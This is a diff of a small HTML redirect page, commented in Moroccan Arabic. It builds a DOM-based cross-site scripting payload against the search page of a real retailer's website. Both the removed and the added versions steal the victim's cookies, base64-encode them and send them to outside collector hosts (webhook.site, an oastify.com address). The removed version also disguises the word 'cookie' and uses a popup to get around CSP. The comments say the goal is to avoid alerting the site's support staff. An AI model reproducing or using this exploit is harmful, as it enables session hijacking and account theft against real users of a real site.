@@ -1,25 +1,16 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Redirecting...</title>
+</head>
 <body>
     <script>
-        // كود سحب الداتا بلا ما نكتبو كلمة "cookie" (استعملنا التمويه)
-        let payload = `
-            (function(){
-                var d = document['coo' + 'kie']; // تمويه الكلمة
-                var b64 = btoa(unescape(encodeURIComponent(d)));
-                var url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?data=" + b64;
-                
-                // فتح نافذة جديدة كيهرب من الـ CSP ديال الصفحة الأصلية
-                var win = window.open(url, '_blank', 'width=100,height=100');
-                if(win) { setTimeout(function(){ win.close(); }, 3000); }
-            })();
-        `;
-
-        let encoded = encodeURIComponent(payload);
+        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
+        let exfiltrate = "fetch('https://lg53e95u4k4bmq30cgizvi0bu20towcl.oastify.com/?data='+btoa(document.cookie))";
         
-        // استغلال الـ Hash # اللي هو الساروت ديالنا
-        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
-
+        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
+        
         window.location.href = finalTarget;
     </script>
 </body>
